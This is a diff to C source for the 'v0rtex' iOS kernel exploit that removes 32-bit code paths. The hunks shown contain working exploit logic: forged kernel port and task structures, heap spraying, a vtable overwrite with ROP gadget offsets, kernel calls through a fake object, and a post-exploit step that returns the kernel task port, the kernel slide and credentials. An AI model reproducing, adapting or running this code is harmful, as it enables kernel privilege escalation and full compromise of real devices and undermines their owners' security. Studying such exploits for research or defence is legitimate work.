@@ -120,11 +120,7 @@ _src < _end; \
 ); \
 } while(0)
 
-#ifdef __LP64__
-#   define UNALIGNED_KPTR_DEREF(addr) (((kptr_t)*(volatile uint32_t*)(addr)) | (((kptr_t)*((volatile uint32_t*)(addr) + 1)) << 32))
-#else
-#   define UNALIGNED_KPTR_DEREF(addr) ((kptr_t)*(volatile uint32_t*)(addr))
-#endif
+#define UNALIGNED_KPTR_DEREF(addr) (((kptr_t)*(volatile uint32_t*)(addr)) | (((kptr_t)*((volatile uint32_t*)(addr) + 1)) << 32))
 
 #define VOLATILE_ZERO(addr, size) \
 do \
@@ -148,7 +144,7 @@ port = MACH_PORT_NULL; \
 
 
 //------------------------------------------------------------------------------
-#pragma mark - IOKit
+#pragma mark - symbols
 
 typedef mach_port_t io_service_t;
 typedef mach_port_t io_connect_t;
@@ -160,10 +156,6 @@ kern_return_t IOServiceClose(io_connect_t client);
 kern_return_t IOConnectCallStructMethod(mach_port_t connection, uint32_t selector, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
 kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt, void *outputStruct, size_t *outputStructCnt);
 kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
-
-
-//------------------------------------------------------------------------------
-#pragma mark - other unexported symbols
 
 kern_return_t mach_vm_remap(vm_map_t dst, mach_vm_address_t *dst_addr, mach_vm_size_t size, mach_vm_offset_t mask, int flags, vm_map_t src, mach_vm_address_t src_addr, boolean_t copy, vm_prot_t *cur_prot, vm_prot_t *max_prot, vm_inherit_t inherit);
 
@@ -528,8 +520,10 @@ typedef union
 } ktask_t;
 
 
+
 //------------------------------------------------------------------------------
-#pragma mark - v0rtex exploit
+//------------------------------------------------------------------------------
+#pragma mark - v0rtex exploit -
 
 kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kerncred, uint64_t *selfcred, uint64_t *selfproc) {
     kern_return_t retval = KERN_FAILURE,
@@ -724,7 +718,6 @@ kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kerncred, uint64_
             .data = 0x0,
             .type = 0x11,
         },
-#ifdef __LP64__
         .ip_messages =
         {
             .port =
@@ -741,7 +734,6 @@ kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kerncred, uint64_
         },
         .ip_nsrequest = 0x0,
         .ip_pdrequest = 0x11,
-#endif
     };
     for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
@@ -800,10 +792,8 @@ kern_return_t v0rtex(task_t *tfp0, uint64_t *kslide, uint64_t *kerncred, uint64_
         for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
         {
             *(((volatile uint32_t*)&dptr[j].ip_context) + 1) = 0x10000000 | i;
-#ifdef __LP64__
             *(volatile uint32_t*)&dptr[j].ip_messages.port.pad = 0x20000000 | i;
             *(volatile uint32_t*)&dptr[j].ip_lock.pad = 0x30000000 | i;
-#endif
         }
         uint32_t dummy = 0;
         size = sizeof(dummy);
@@ -1069,11 +1059,7 @@ goto out; \
         goto out;
     }
     
-#ifdef __LP64__
     vtab[OFFSET_vtab_get_external_trap_for_index] = OFF(ROP_LDR_X0_X0_0x10);
-#else
-    vtab[OFFSET_vtab_get_external_trap_for_index] = OFF(rop_ldr_r0_r0_0xc);
-#endif
     
     uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? fakeport_off + sizeof(kport_t) : 0;
     faketask_off = UINT64_ALIGN(faketask_off);
@@ -1340,7 +1326,6 @@ fakeobj_buf->a.indirect[2] = (addr), \
         goto out;
     }
     
-#ifdef __LP64__
     kmap_hdr_t zm_hdr = { 0 };
     r = KCALL(OFF(COPYOUT), zm_task_buf->a.map + OFFSET_vm_map_hdr, &zm_hdr, sizeof(zm_hdr), 0, 0, 0, 0);
     LOG("zm_range: " ADDR "-" ADDR ", %s", zm_hdr.start, zm_hdr.end, errstr(r));
@@ -1354,14 +1339,12 @@ fakeobj_buf->a.indirect[2] = (addr), \
         goto out;
     }
     kptr_t zm_tmp = 0; // macro scratch space
-#   define ZM_FIX_ADDR(addr) \
+    
+#define ZM_FIX_ADDR(addr) \
 ( \
 zm_tmp = (zm_hdr.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
 zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
 )
-#else
-#   define ZM_FIX_ADDR(addr) (addr)
-#endif
     
     kptr_t ptrs[2] = { 0 };
     ptrs[0] = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
@@ -1437,23 +1420,12 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     
 #pragma mark - post-exploit
     
-//    if (callback) {
-//        ret = callback(kernel_task, kbase, cb_data);
-//        if (ret != KERN_SUCCESS) {
-//            LOG("callback returned error: %s", mach_error_string(ret));
-//            goto out;
-//        }
-//    }
-    
-    
     // Stuff needed for post-exploitation duties...
-    
     *tfp0 = kernel_task;
     *kslide = slide;
     *kerncred = kern_ucred;
     *selfcred = self_ucred;
     *selfproc = self_proc;
-    
     
     retval = KERN_SUCCESS;
     
@@ -1493,8 +1465,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     {
         retval = ret;
     }
-    
-    
+        
     return retval;
 }
 
